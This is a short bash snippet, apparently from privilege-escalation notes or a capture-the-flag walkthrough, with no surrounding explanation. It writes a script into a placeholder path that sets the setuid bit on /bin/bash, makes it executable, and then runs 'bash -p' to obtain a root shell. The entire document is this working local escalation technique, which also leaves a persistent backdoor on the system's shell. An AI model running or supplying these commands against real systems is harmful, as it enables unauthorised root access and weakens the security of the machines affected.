

```bash
echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /path/bin
chmod +x /path/bin
/bin/bash -p
```


